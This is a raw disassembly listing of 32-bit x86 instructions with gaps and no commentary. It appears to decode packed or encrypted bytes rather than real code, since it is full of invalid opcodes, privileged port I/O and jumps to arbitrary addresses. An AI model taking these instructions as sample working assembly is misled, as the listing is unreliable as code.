  421aaa:	stos   DWORD PTR es:[edi],eax
  421aab:	clc    
  421aac:	int    0x84
  421aae:	scas   al,BYTE PTR es:[edi]
  421aaf:	mul    BYTE PTR [ecx+0x9]
  421ab2:	xchg   esi,eax
  421ab3:	or     ah,BYTE PTR [edi+0x1d]
  421ab6:	xor    ebx,edx
  421ab8:	lods   eax,DWORD PTR ds:[esi]
  421ab9:	mov    ds:0x1b40a057,al
  421abe:	ret    
  421abf:	test   al,0xf0
  421ac1:	xchg   DWORD PTR [edx-0x44486604],esp
  421ac7:	leave  
  421ac8:	cmp    DWORD PTR [ebx-0x48f0ca8f],esp
  421ace:	xchg   BYTE PTR [ebx-0x5be6af65],dh
  421ad4:	sub    ah,ah
  421ad6:	sub    DWORD PTR [ecx+0x51],eax
  421ad9:	mov    cl,0xad
  421adb:	shl    DWORD PTR ds:0xbfc149ce,1
  421ae1:	mov    cl,0xbc
  421ae3:	inc    esp
  421ae4:	mov    DWORD PTR [edi-0x4b9527ae],ecx
  421aea:	mov    ebx,0x73fd7283
  421aef:	inc    ebx
  421af0:	mov    dl,0x1d
  421af2:	dec    eax
  421af3:	inc    esi
  421af4:	fs clc 
  421af6:	inc    edi
  421af7:	lods   eax,DWORD PTR ds:[esi]
  421af8:	cmp    DWORD PTR [esi-0x1473045d],0x11
  421aff:	xchg   edx,eax
  421b00:	mov    al,0xc9
  421b02:	pushf  
  421b03:	add    bl,0x0
  421b06:	sar    BYTE PTR [ecx],1
  421b08:	push   esp
  421b09:	mov    BYTE PTR [ebp+edx*8-0x3ff32cbb],cl
	...
  421b74:	push   ss
  421b75:	cdq    
  421b76:	jmp    0x37400b48
  421b7b:	fild   DWORD PTR [ecx+eax*8+0x28]
  421b7f:	or     dl,BYTE PTR [esi]
  421b81:	add    ch,BYTE PTR [ebx+0x16728da]
  421b87:	add    BYTE PTR [ecx+eax*1],al
  421b8a:	add    BYTE PTR [eax],al
  421b8c:	mov    ebp,0xe04cd09f
  421b91:	xchg   edi,eax
  421b92:	lods   al,BYTE PTR ds:[esi]
  421b93:	sbb    dl,BYTE PTR [ebx-0x2f8053a4]
  421b99:	jge    0x421b82
  421b9b:	xchg   ebp,eax
  421b9c:	xor    DWORD PTR cs:[ecx+edi*8],ebx
  421ba0:	or     edx,edi
  421ba2:	mov    BYTE PTR [ecx+0x3d87526],0x58
  421ba9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421baa:	cmp    cl,cl
  421bac:	and    esp,DWORD PTR ds:0xd3fdde32
  421bb2:	mov    DWORD PTR [esi+0x104ce76d],0x7dea5ea7
  421bbc:	push   0x18c1f2a
  421bc1:	stc    
  421bc2:	xchg   BYTE PTR [esi+edi*1+0x3f50c5b8],dh
  421bc9:	mov    bl,0x9a
  421bcb:	adc    BYTE PTR [edx],bh
  421bcd:	sub    eax,0xe28f7172
  421bd2:	addr16 or eax,0xe838ef6c
  421bd8:	or     dh,BYTE PTR [ebx+0x6a287b4e]
  421bde:	cmp    edx,edi
  421be0:	mov    ds:0xa74d8976,eax
  421be5:	(bad)  
  421be6:	outs   dx,DWORD PTR ds:[esi]
  421be7:	stos   BYTE PTR es:[edi],al
  421be8:	ins    BYTE PTR es:[edi],dx
  421be9:	(bad)  
  421bea:	lods   al,BYTE PTR ds:[esi]
  421beb:	jge    0x421b7c
  421bed:	out    dx,al
  421bee:	lahf   
  421bef:	jnp    0x421bd8
  421bf1:	cdq    
  421bf2:	mov    ah,0xf2
  421bf4:	lea    esi,[esi+0x54]
  421bf7:	ins    BYTE PTR es:[edi],dx
  421bf8:	test   BYTE PTR [eax+0x3ce77f6d],dl
  421bfe:	inc    ebx
  421bff:	call   0xdace:0xcba741ae
  421c06:	lods   al,BYTE PTR ds:[esi]
  421c07:	sub    ch,bh
  421c09:	adc    esi,DWORD PTR [edi]
  421c0b:	pop    ds
  421c0c:	sbb    bh,BYTE PTR [ecx]
  421c0e:	jns    0x421b91
  421c10:	adc    ecx,eax
  421c12:	jb     0x421bbb
  421c14:	inc    ecx
  421c15:	inc    DWORD PTR [ebp+0x79]
  421c18:	jbe    0x421bd9
  421c1a:	int3   
  421c1b:	cwde   
  421c1c:	dec    ebx
  421c1d:	cmp    dl,dl
  421c1f:	adc    ch,BYTE PTR [ecx]
  421c21:	jle    0x421c75
  421c23:	cld    
  421c24:	push   cs
  421c25:	push   ebx
  421c26:	ins    BYTE PTR es:[edi],dx
  421c27:	(bad)  
  421c28:	dec    edi
  421c29:	adc    eax,0xabb8c5ba
  421c2e:	pop    ecx
  421c2f:	cmp    eax,0x3936c98d
  421c34:	inc    esp
  421c35:	mov    esp,0x314643e
  421c3a:	lods   eax,DWORD PTR ds:[esi]
  421c3b:	in     eax,0x51
  421c3d:	adc    DWORD PTR [esi+0x0],0x61335f69
  421c44:	cmp    dl,BYTE PTR [esi-0x7acca63d]
  421c4a:	test   DWORD PTR [ebx],eax
  421c4c:	mov    ebx,0xb662e6dc
  421c51:	jns    0x421cb4
  421c53:	push   eax
  421c54:	jnp    0x421c5f
  421c56:	je     0x421c15
  421c58:	daa    
  421c59:	jg     0x421c75
  421c5b:	mov    dl,0x14
  421c5d:	stos   DWORD PTR es:[edi],eax
  421c5e:	add    edi,DWORD PTR [eax+edx*4+0x1]
  421c62:	sbb    DWORD PTR [ebx-0x50a91fd7],eax
  421c68:	jbe    0x421c3c
  421c6a:	pop    ebx
  421c6b:	push   0xffffffce
  421c6d:	ret    
  421c6e:	mov    dl,0xc9
  421c70:	and    dl,ch
  421c72:	pop    ebp
  421c73:	sub    ch,bh
  421c75:	sub    DWORD PTR [ebx+0x4443f94e],esp
  421c7b:	call   0x6b:0x724ea682
  421c82:	xchg   ebx,eax
  421c83:	cld    
  421c84:	es out 0x59,al
  421c87:	fnsave [ebp-0x3e]
  421c8a:	dec    esi
  421c8b:	push   ebx
  421c8c:	push   eax
  421c8d:	enter  0x6d62,0x0
	...
  421cf1:	add    BYTE PTR [eax],al
  421cf3:	add    BYTE PTR [eax-0x1a4a95],dh
  421cf9:	push   eax
  421cfb:	jg     0x421d51
  421cfd:	dec    edi
  421cfe:	xchg   edx,eax
  421cff:	dec    edi
  421d00:	dec    ebp
  421d01:	jbe    0x421d45
  421d03:	(bad)  
  421d04:	sub    al,0x68
  421d06:	add    DWORD PTR [eax],eax
  421d08:	add    al,0x1
  421d0a:	add    BYTE PTR [eax],al
  421d0c:	popa   
  421d0d:	or     DWORD PTR [ecx+0xb4cdf04],esp
  421d13:	cwde   
  421d14:	add    al,0xc9
  421d16:	jnp    0x421cac
  421d18:	jns    0x421d95
  421d1a:	mov    ecx,0x72431eb1
  421d1f:	jl     0x421d76
  421d21:	and    ah,BYTE PTR [edx+0x5447c19c]
  421d27:	popf   
  421d28:	sub    eax,0xf088b541
  421d2d:	and    eax,0xf5440583
  421d32:	dec    ebx
  421d33:	ror    BYTE PTR [edi],1
  421d35:	das    
  421d36:	cld    
  421d37:	jg     0x421cda
  421d39:	add    al,BYTE PTR [eax-0x125cc16c]
  421d3f:	pmaxub mm1,mm7
  421d42:	sbb    edi,DWORD PTR [esp+edx*1+0x36c53ff4]
  421d49:	ins    DWORD PTR es:[edi],dx
  421d4a:	es jno 0x421d3a
  421d4d:	je     0x421db8
  421d4f:	xor    eax,0x76521ca7
  421d54:	(bad)  
  421d55:	jae    0x421d66
  421d57:	mov    bh,0xb5
  421d59:	sbb    al,0xc5
  421d5b:	hlt    
  421d5c:	fs je  0x421d9b
  421d5f:	mov    bh,0x9c
  421d61:	ror    BYTE PTR [eax-0x5d],0x76
  421d65:	pop    ecx
  421d66:	mov    edi,0x155c9073
  421d6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421d6c:	sbb    eax,0xbcf33adf
  421d71:	dec    esi
  421d72:	shl    BYTE PTR [edx],1
  421d74:	aas    
  421d75:	cmp    BYTE PTR [edx+0x7c013a26],cl
  421d7b:	fld    DWORD PTR [edi+0x6befc549]
  421d81:	(bad)  
  421d82:	rcl    BYTE PTR [esi-0x10],cl
  421d85:	push   esp
  421d86:	mov    edx,0xe482f28b
  421d8b:	mov    ds:0x709e5d52,eax
  421d90:	fdiv   st,st(6)
  421d92:	scas   al,BYTE PTR es:[edi]
  421d93:	mov    edx,0x49ce540a
  421d98:	pop    eax
  421d99:	sbb    DWORD PTR [edi-0x5186469],0xffffff98
  421da0:	cs std 
  421da2:	aam    0x17
  421da4:	mov    ah,0xd4
  421da6:	xor    al,0x30
  421da8:	adc    al,0xe
  421daa:	std    
  421dab:	sbb    al,0xc8
  421dad:	jbe    0x421e05
  421daf:	fs jo  0x421e11
  421db2:	ja     0x421de8
  421db4:	and    BYTE PTR [eax-0x74],0x8
  421db8:	adc    DWORD PTR [ebp+eiz*1-0x4a9beb47],esp
  421dbf:	or     DWORD PTR [edi],ebp
  421dc1:	ja     0x421db1
  421dc3:	imul   esi,DWORD PTR [edx],0x9
  421dc6:	inc    esp
  421dc7:	dec    esp
  421dc8:	adc    esi,ebx
  421dca:	push   ss
  421dcb:	inc    edi
  421dcc:	sub    eax,DWORD PTR [eax]
  421dce:	mov    ss,WORD PTR [ebx]
  421dd0:	pop    ebp
  421dd1:	jbe    0x421dc1
  421dd3:	mov    cl,0xc8
  421dd5:	mov    ebp,0x9c5bd293
  421dda:	pop    esi
  421ddb:	loopne 0x421e47
  421ddd:	pusha  
  421dde:	xor    BYTE PTR [ebp+esi*4-0x12],bl
  421de2:	xchg   BYTE PTR [edi-0x30457219],al
  421de8:	in     eax,0xc5
  421dea:	cmp    DWORD PTR [edx+0x6d],esi
  421ded:	push   ebx
  421dee:	sbb    eax,0x64ad567e
  421df3:	je     0x421e6b
  421df5:	popa   
  421df6:	xor    ebp,ecx
  421df8:	stos   BYTE PTR es:[edi],al
  421df9:	inc    ebp
  421dfa:	push   edx
  421dfb:	outs   dx,DWORD PTR ds:[esi]
  421dfc:	ds mov ecx,0x4931ff27
  421e02:	call   0x1411212d
  421e07:	adc    esi,DWORD PTR [ebp+0x67]
  421e0a:	vmwrite ecx,ebx
  421e0d:	hlt    
  421e0e:	ins    BYTE PTR es:[edi],dx
  421e0f:	pop    ss
	...
  421e74:	iret   
  421e75:	mov    eax,ds:0xbf7f851b
  421e7a:	fucomip st,st(3)
  421e7c:	push   es
  421e7d:	ins    BYTE PTR es:[edi],dx
  421e7e:	xor    al,0xb9
  421e80:	dec    ecx
  421e81:	jnp    0x421e4d
  421e83:	sub    al,0x30
  421e85:	imul   eax,DWORD PTR [ecx],0x10400
  421e8b:	add    BYTE PTR [edi-0x1b],cl
  421e8e:	out    dx,al
  421e8f:	dec    esi
  421e90:	pop    ecx
  421e91:	shl    DWORD PTR [ecx+eax*2-0x54186b00],1
  421e98:	jae    0x421eae
  421e9a:	(bad)  
  421e9b:	dec    esi
  421e9c:	xchg   DWORD PTR [ecx],eax
  421e9e:	sar    BYTE PTR [ecx+0x3c235acc],0xaa
  421ea5:	pop    ecx
  421ea6:	jne    0x421ef4
  421ea8:	cmp    eax,DWORD PTR [esi]
  421eaa:	mov    esp,0xf1e118e5
  421eaf:	ds call 0x78ce:0x579e5132
  421eb7:	jle    0x421e52
  421eb9:	stos   DWORD PTR es:[edi],eax
  421eba:	shr    bl,0x19
  421ebd:	adc    DWORD PTR [edi+edi*1],eax
  421ec0:	(bad)  
  421ec1:	cld    
  421ec2:	mov    al,0x3
  421ec4:	adc    eax,0xb2153d7
  421ec9:	jp     0x421eb3
  421ecb:	mov    dh,0xd4
  421ecd:	jae    0x421e5e
  421ecf:	jecxz  0x421ee3
  421ed1:	lahf   
  421ed2:	fiadd  DWORD PTR [ebx]
  421ed4:	inc    edi
  421ed5:	in     eax,0xc
  421ed7:	popf   
  421ed8:	and    ch,BYTE PTR [ebx]
  421eda:	mov    ebp,0x800fe50e
  421edf:	jns    0x421f0a
  421ee1:	inc    esp
  421ee2:	adc    al,0x66
  421ee4:	pop    ecx
  421ee5:	mov    dh,ah
  421ee7:	pop    edx
  421ee8:	fstp   TBYTE PTR [edx+0x72]
  421eeb:	aaa    
  421eec:	mov    bh,BYTE PTR [edx+ebp*2]
  421eef:	int3   
  421ef0:	push   cs
  421ef1:	cwde   
  421ef2:	test   eax,0x4cba58fc
  421ef7:	add    bl,BYTE PTR [esi]
  421ef9:	cs xchg ecx,eax
  421efb:	cs sbb eax,0x1aa1ea6a
  421f01:	in     eax,dx
  421f02:	dec    ebx
  421f03:	retf   
  421f04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421f05:	repz sbb ebx,DWORD PTR [eax+0x1e]
  421f09:	xor    DWORD PTR [esi-0x3f],ebp
  421f0c:	xchg   esi,eax
  421f0d:	pop    esp
  421f0e:	mov    ah,0x23
  421f10:	inc    ecx
  421f11:	cdq    
  421f12:	div    DWORD PTR [eax+0x56]
  421f15:	jnp    0x421f3d
  421f17:	sar    DWORD PTR [edx],0xed
  421f1a:	inc    esi
  421f1b:	rcr    al,1
  421f1d:	xor    DWORD PTR ds:0x5ec0ce38,esi
  421f23:	arpl   WORD PTR ss:[esi],ax
  421f26:	arpl   WORD PTR [ebx+ebp*4-0x4],si
  421f2a:	outs   dx,DWORD PTR ds:[esi]
  421f2b:	retf   
  421f2c:	fdivr  QWORD PTR cs:[eax+0x44]
  421f30:	iret   
  421f31:	dec    esp
  421f32:	ins    BYTE PTR es:[edi],dx
  421f33:	jbe    0x421fa7
  421f35:	sub    BYTE PTR [ecx+0x62527234],dl
  421f3b:	test   al,0xa5
  421f3d:	push   edx
  421f3e:	rol    BYTE PTR [esi],cl
  421f40:	dec    edi
  421f41:	sbb    BYTE PTR [ebx],0x6d
  421f44:	push   edi
  421f45:	ins    BYTE PTR es:[edi],dx
  421f46:	sub    BYTE PTR [esi+0x17],0xa9
  421f4a:	int    0x24
  421f4c:	or     DWORD PTR [eax+esi*8-0x3914aaa3],ecx
  421f53:	loope  0x421f51
  421f55:	sbb    dl,BYTE PTR [esi+0x44]
  421f58:	pushf  
  421f59:	cs adc al,0x55
  421f5c:	cmp    DWORD PTR [edx+0x6e],eax
  421f5f:	ins    BYTE PTR es:[edi],dx
  421f60:	je     0x421fdc
  421f62:	xlat   BYTE PTR ds:[ebx]
  421f63:	adc    dl,BYTE PTR [edi]
  421f65:	test   esp,esp
  421f67:	ins    BYTE PTR es:[edi],dx
  421f68:	mov    ebx,0xebfc2c91
  421f6d:	add    al,0xab
  421f6f:	lahf   
  421f70:	repnz int3 
  421f72:	adc    bh,BYTE PTR [edx+eax*1]
  421f75:	sbb    bh,BYTE PTR [edx+0x6e2c1744]
  421f7b:	mov    dh,0xf6
  421f7d:	cmp    dl,BYTE PTR [edx+ecx*4]
  421f80:	inc    esi
  421f81:	stc    
  421f82:	pop    ebx
  421f83:	or     al,0xc9
  421f85:	das    
  421f86:	jle    0x421f9b
  421f88:	(bad)  
  421f89:	(bad)  
  421f8a:	fcom   QWORD PTR [ebp+0x14]
  421f8d:	lea    edi,[ebx+0x8a]
	...
  421ff3:	add    BYTE PTR [ebx+0x6],ch
  421ff6:	(bad)  
  421ff7:	dec    edi
  421ff8:	out    dx,eax
  421ff9:	iret   
  421ffa:	jmp    0x422022
  421ffc:	aas    
  421ffd:	in     eax,dx
  421ffe:	push   es
  421fff:	data16 sub al,0xc
  422002:	mov    DWORD PTR [edi+0x34],ecx
  422005:	push   0x1
  422007:	add    BYTE PTR [ecx+eax*1],al
  42200a:	add    BYTE PTR [eax],al
  42200c:	push   ebx
  42200d:	icebp  
  42200e:	mov    edx,0xcbf1df8d
  422013:	lea    edx,[eax-0x72010902]
  422019:	stos   DWORD PTR es:[edi],eax
  42201a:	scas   eax,DWORD PTR es:[edi]
  42201b:	sti    
  42201c:	dec    ebp
  42201d:	fcom   st(7)
  42201f:	mov    esp,0x9521e73d
  422024:	xor    BYTE PTR [edi+eax*2],ch
  422027:	dec    eax
  422028:	xchg   esp,eax
  422029:	or     esp,DWORD PTR [eax-0x1a]
  42202c:	or     BYTE PTR [edi-0x673e1931],bl
  422032:	cs cmp eax,0x27739ed8
  422038:	cmp    BYTE PTR [esp+ebp*8],dl
  42203b:	mov    edi,DWORD PTR [edx-0x48647580]
  422041:	sahf   
  422042:	mov    eax,ds:0x1f6a4a68
  422047:	out    0xef,eax
  422049:	scas   al,BYTE PTR es:[edi]
  42204a:	popf   
  42204b:	inc    edi
  42204c:	clc    
  42204d:	sbb    DWORD PTR [eax],esi
  42204f:	xchg   DWORD PTR [eax*4-0x6941cc18],edx
  422056:	out    dx,eax
  422057:	jp     0x422011
  422059:	xor    dh,cl
  42205b:	jmp    0x4220b6
  42205d:	(bad)  
  42205e:	sbb    eax,0x46369f50
  422063:	mov    eax,0x73c2ea19
  422068:	repnz lea ebp,[esi+edx*2-0x286c045e]
  422070:	retf   0x129d
  422073:	(bad)  
  422074:	xlat   BYTE PTR ds:[ebx]
  422075:	inc    ebx
  422076:	dec    esp
  422077:	mov    eax,ds:0x8d6c39d7
  42207c:	dec    esi
  42207d:	test   eax,0xdc0736f0
  422082:	inc    edi
  422083:	mov    al,ds:0x931cd4f6
  422088:	idiv   BYTE PTR gs:[esi+0x664bc558]
  42208f:	push   0x72
  422091:	jne    0x4220da
  422093:	mov    dl,cl
  422095:	aaa    
  422096:	push   edx
  422097:	dec    ebx
  422098:	call   0x7de87881
  42209d:	or     dl,BYTE PTR [eax]
  42209f:	fdivr  QWORD PTR [esi]
  4220a1:	xchg   esi,eax
  4220a2:	cmp    DWORD PTR [edi],ebp
  4220a4:	push   cs
  4220a5:	sub    dh,BYTE PTR [ebp-0x36b34023]
  4220ab:	std    
  4220ac:	std    
  4220ad:	mov    dh,0x73
  4220af:	and    edx,esi
  4220b1:	xchg   DWORD PTR [ecx-0x1d],eax
  4220b4:	add    DWORD PTR [ebp+0x6d],ebp
  4220b7:	push   eax
  4220b8:	sahf   
  4220b9:	iret   
  4220ba:	cmp    bl,dl
  4220bc:	fdivr  DWORD PTR [edi+0x298b2d1e]
  4220c2:	cmp    bh,BYTE PTR [edi-0x771c6e3c]
  4220c8:	shl    BYTE PTR [esi],0xc
  4220cb:	push   ebp
  4220cc:	jbe    0x4220eb
  4220ce:	mov    bl,0x7f
  4220d0:	xchg   BYTE PTR [esi+0x26fbac51],ah
  4220d6:	imul   ecx,ebp,0xfffffff1
  4220d9:	iret   
  4220da:	xor    eax,edi
  4220dc:	dec    esi
  4220dd:	icebp  
  4220de:	fdivr  QWORD PTR [edi]
  4220e0:	test   BYTE PTR [esi],0x53
  4220e3:	dec    ebx
  4220e4:	xor    BYTE PTR [ebx-0x64],bl
  4220e7:	xchg   ebp,eax
  4220e8:	fisubr DWORD PTR [ebx+0x3a]
  4220eb:	push   edi
  4220ed:	xchg   edi,eax
  4220ee:	xchg   ecx,eax
  4220ef:	jno    0x422165
  4220f1:	fisub  WORD PTR [esp+ecx*1+0x7ad436ed]
  4220f8:	fstp   TBYTE PTR [edx+0x62]
  4220fb:	adc    al,0xe5
  4220fd:	in     eax,dx
  4220fe:	cs mov edi,0xfe4d0d6
  422104:	mov    ecx,0xe232edde
  422109:	div    BYTE PTR [esi+0x364d2981]
  42210f:	push   edx
	...
  422174:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422175:	push   edx
  422176:	jnp    0x422175
  422178:	(bad)  
  422179:	std    
  42217a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42217b:	pop    ebx
  42217c:	dec    edx
  42217d:	sub    al,0x42
  42217f:	sub    ebx,DWORD PTR [edi]
  422181:	pop    ss
  422182:	sub    DWORD PTR [ebx],eax
  422184:	cmp    BYTE PTR [ebx+0x1],ch
  422187:	add    BYTE PTR [ecx+eax*1],al
  42218a:	add    BYTE PTR [eax],al
  42218c:	dec    ebp
  42218d:	in     eax,0x3e
  42218f:	dec    ebx
  422190:	out    dx,eax
  422191:	lds    ecx,FWORD PTR [esp+eax*8]
  422194:	cli    
  422195:	xchg   edx,eax
  422196:	cmp    DWORD PTR [edx+0x60],ecx
  422199:	imul   edx,DWORD PTR [edi+edi*8-0x48],0x0
  42219e:	mov    cl,BYTE PTR [ecx+0x1b7dda3a]
  4221a4:	lods   eax,DWORD PTR ds:[esi]
  4221a5:	(bad)  
  4221a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4221a7:	pop    ss
  4221a8:	cdq    
  4221a9:	push   ebx
  4221aa:	xchg   ecx,eax
  4221ab:	mov    ah,0xcd
  4221ad:	rcr    DWORD PTR [edi-0x2a],cl
  4221b0:	mov    ebx,fs
  4221b2:	mov    eax,ds:0x31badc0c
  4221b7:	out    dx,al
  4221b8:	(bad)  
  4221b9:	sub    esp,DWORD PTR [eax+0x2de57d3c]
  4221bf:	stos   BYTE PTR es:[edi],al
  4221c0:	add    al,0x81
  4221c2:	add    eax,0x602f299f
  4221c7:	jge    0x4221bb
  4221c9:	aas    
  4221ca:	push   esp
  4221cb:	cmc    
  4221cc:	arpl   WORD PTR [ecx+0x3f],di
  4221cf:	icebp  
  4221d0:	clc    
  4221d1:	xchg   ebx,eax
  4221d2:	fldcw  WORD PTR [edi+0x3b7dec05]
  4221d8:	mov    eax,ds:0x32de2fea
  4221dd:	sub    cl,BYTE PTR [ecx-0x223eb219]
  4221e3:	test   BYTE PTR [ecx+eiz*4-0x43],ah
  4221e7:	pop    esi
  4221e8:	cmp    esp,ecx
  4221ea:	cmc    
  4221eb:	rol    BYTE PTR [ebp-0x76],0xb0
  4221ef:	into   
  4221f0:	or     edi,DWORD PTR [ebx+ebx*2-0x38ad56ef]
  4221f7:	cmp    al,0x35
  4221f9:	sub    cl,BYTE PTR [ebx]
  4221fb:	jl     0x42218f
  4221fd:	jns    0x4221fa
  4221ff:	popa   
  422200:	pop    eax
  422201:	je     0x422212
  422203:	inc    esp
  422204:	sahf   
  422205:	mov    gs,edi
  422207:	cmp    ah,BYTE PTR [edi]
  422209:	and    eax,0xfd4ba7ea
  42220e:	iret   
  42220f:	sub    DWORD PTR [ebx+0x71],ebx
  422212:	out    dx,al
  422213:	mov    ds:0x875e4c5a,al
  422218:	mov    ds:0xce3484bf,al
  42221d:	in     al,0x85
  42221f:	ins    DWORD PTR es:[edi],dx
  422220:	sub    eax,0x3f70796e
  422225:	inc    ebx
  422226:	rcl    BYTE PTR [ecx],0x28
  422229:	dec    ecx
  42222a:	ss scas al,BYTE PTR es:[edi]
  42222c:	call   0xc8ed:0xa6f2a194
  422233:	rcl    BYTE PTR [edx],cl
  422235:	lods   al,BYTE PTR ds:[esi]
  422236:	add    al,0x5c
  422238:	scas   eax,DWORD PTR es:[edi]
  422239:	test   BYTE PTR [ecx+0x22],dh
  42223c:	push   ebx
  42223d:	mov    cl,0x5f
  42223f:	mov    ah,0x8
  422241:	repz jle 0x42225d
  422244:	cs pop ebx
  422246:	int3   
  422247:	inc    ebx
  422248:	es push cs
  42224a:	mov    al,0x83
  42224c:	or     eax,0xd2f540c9
  422251:	xchg   edx,eax
  422252:	xchg   BYTE PTR [esi-0x22798660],bh
  422258:	dec    edx
  422259:	hlt    
  42225a:	lods   al,BYTE PTR ds:[esi]
  42225b:	test   eax,0xcd387257
  422260:	fcom   QWORD PTR [esi+0x6a665e19]
  422266:	cmp    al,0xbf
  422268:	lods   al,BYTE PTR ds:[esi]
  422269:	jmp    0xf542:0x278f6d16
  422270:	js     0x4222bf
  422272:	pop    eax
  422273:	outs   dx,BYTE PTR ds:[esi]
  422274:	ror    DWORD PTR [esi],1
  422276:	cdq    
  422277:	fnstsw WORD PTR [ecx]
  422279:	jecxz  0x4222d0
  42227b:	push   esp
  42227c:	mov    al,ds:0x7c61a704
  422281:	outs   dx,BYTE PTR ds:[esi]
  422282:	mov    ebp,0xc1545428
  422287:	mov    eax,0x4f3f3b07
  42228c:	lods   eax,DWORD PTR ds:[esi]
  42228d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42228e:	in     eax,0x6c
	...
  4222f4:	(bad)  
  4222f5:	in     eax,dx
  4222f6:	lods   eax,DWORD PTR ds:[esi]
  4222f7:	imul   edi
  4222f9:	neg    edi
  4222fb:	std    
  4222fc:	sub    ebx,DWORD PTR [ebp+0x71]
  4222ff:	dec    ecx
  422300:	add    DWORD PTR [eax],ecx
  422302:	sbb    ebp,esp
  422304:	cmp    al,0x6c
  422306:	add    DWORD PTR [eax],eax
  422308:	add    al,0x1
  42230a:	add    BYTE PTR [eax],al
  42230c:	leave  
  42230d:	cmc    
  42230e:	cmp    DWORD PTR [edi+0x68a8d6e4],ebx
  422314:	cld    
  422315:	retf   
  422316:	ins    DWORD PTR es:[edi],dx
  422317:	sti    
  422318:	jp     0x422345
  42231a:	mov    ebx,DWORD PTR [esi]
  42231c:	or     bl,al
  42231e:	adc    BYTE PTR [ecx],dh
  422320:	mov    esi,0x72704603
  422325:	dec    ebp
  422326:	push   es
  422327:	fs mov ch,0x57
  42232a:	ja     0x422386
  42232c:	sti    
  42232d:	cld    
  42232e:	push   esp
  42232f:	mov    eax,0x966c7869
  422334:	mov    eax,ds:0xa3c11ea3
  422339:	push   esi
  42233a:	push   edi
  42233b:	mov    ebp,0xe85fae76
  422340:	xor    bl,bl
  422342:	xchg   DWORD PTR [ebx+0x56c84901],ebp
  422348:	pop    ss
  422349:	fwait
  42234a:	pop    esp
  42234b:	ins    DWORD PTR es:[edi],dx
  42234c:	adc    al,0x9c
  42234e:	lea    esi,ds:[ebp+0x7d868b05]
  422355:	inc    eax
  422356:	sub    BYTE PTR [esi-0x172c3903],0xba
  42235d:	jmp    0x422393
  42235f:	and    al,BYTE PTR [eax]
  422361:	jge    0x42231b
  422363:	push   ds
  422364:	(bad)  
  422365:	int3   
  422366:	push   cs
  422367:	int3   
  422368:	ror    DWORD PTR [edx+ebx*8+0x63],0xa0
  42236d:	cmp    al,0x59
  42236f:	mov    eax,0xc65e2e52
  422374:	(bad)  
  422375:	mov    cl,0x8b
  422377:	hlt    
  422378:	jg     0x4223b8
  42237a:	and    ch,BYTE PTR [esi-0x17]
  42237d:	pop    eax
  42237e:	and    ebp,DWORD PTR [ebx]
  422380:	arpl   WORD PTR [ecx],cx
  422382:	pop    edx
  422383:	hlt    
  422384:	fmul   DWORD PTR [ebp+0xd]
  422387:	dec    ebx
  422388:	adc    eax,0xd87b6efa
  42238d:	out    0x8d,al
  42238f:	shr    DWORD PTR [ebp-0x5d],cl
  422392:	nop
  422393:	outs   dx,BYTE PTR ds:[esi]
  422394:	sub    dh,BYTE PTR [edx+ecx*1+0xc949d6]
  42239b:	lock fcomi st,st(7)
  42239e:	pop    ebp
  42239f:	iret   
  4223a0:	mov    eax,0xe81a947f
  4223a5:	and    DWORD PTR [eax],ebp
  4223a7:	mov    ch,0x8a
  4223a9:	stos   DWORD PTR es:[edi],eax
  4223aa:	loopne 0x4223ee
  4223ac:	cmp    eax,0xcce8523c
  4223b1:	fs jg  0x4223c2
  4223b4:	push   ebx
  4223b5:	test   BYTE PTR [ebx+0x2a],ch
  4223b8:	mov    edx,0x4614fd58
  4223bd:	jg     0x42240a
  4223bf:	or     DWORD PTR [edi+0x77],ebx
  4223c2:	xor    esi,esi
  4223c4:	out    0x4e,al
  4223c6:	sar    BYTE PTR [eax],0x88
  4223c9:	jmp    0x6368:0x295bdaf1
  4223d0:	push   0x27
  4223d2:	in     al,0xa
  4223d4:	inc    ecx
  4223d5:	fwait
  4223d6:	ins    DWORD PTR es:[edi],dx
  4223d7:	neg    ebp
  4223d9:	fild   DWORD PTR [edx+ebp*1+0x18]
  4223dd:	repz push ebx
  4223df:	add    DWORD PTR [edx],eax
  4223e1:	xchg   ecx,eax
  4223e2:	jle    0x422402
  4223e4:	jns    0x422412
  4223e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4223e7:	mov    esp,0x4174aaee
  4223ec:	and    ecx,DWORD PTR [ebx]
  4223ee:	mov    ebp,0x69b3ceb8
  4223f3:	test   al,0x59
  4223f5:	pop    es
  4223f6:	test   eax,0xe87cf131
  4223fb:	xor    edx,DWORD PTR [ebx+0x35b98264]
  422401:	outs   dx,BYTE PTR ds:[esi]
  422402:	push   es
  422403:	fdiv   st(2),st
  422405:	and    bl,BYTE PTR ds:0xf52b5a3a
  42240b:	add    eax,0x21ed1aa2
	...
  422474:	push   edx
  422475:	sub    BYTE PTR [esi],0x69
  422478:	(bad)  
  422479:	in     eax,dx
  42247a:	push   edi
  42247b:	mov    ebx,0x99e531bb
  422480:	inc    eax
  422481:	clc    
  422482:	lods   eax,DWORD PTR ds:[esi]
  422483:	out    dx,eax
  422484:	inc    eax
  422485:	ins    DWORD PTR es:[edi],dx
  422486:	add    DWORD PTR [eax],eax
  422488:	add    al,0x1
  42248a:	add    BYTE PTR [eax],al
  42248c:	mov    dl,0xc9
  42248e:	lahf   
  42248f:	add    al,0x81
  422491:	ja     0x422499
  422493:	mov    eax,ds:0x1325874c
  422498:	push   esp
  422499:	jge    0x4224c0
  42249b:	sub    bh,bl
  42249d:	jmp    0x8704:0x7e2d76a4
  4224a4:	pop    es
  4224a5:	and    ecx,0x55ef9bf9
  4224ab:	lods   al,BYTE PTR ds:[esi]
  4224ac:	jl     0x422433
  4224ae:	pop    esi
  4224af:	pop    esi
  4224b0:	fwait
  4224b1:	rcr    DWORD PTR [ecx+esi*8-0x6f609e8e],cl
  4224b8:	cmc    
  4224b9:	pop    esp
  4224ba:	jnp    0x422448
  4224bc:	xchg   esi,eax
  4224bd:	enter  0xc437,0x20
  4224c1:	enter  0x58f5,0x87
  4224c5:	cmp    al,0x44
  4224c7:	and    al,0x67
  4224c9:	mov    dh,0x6f
  4224cb:	dec    edx
  4224cc:	fcomp  DWORD PTR [edx-0x2d159ad9]
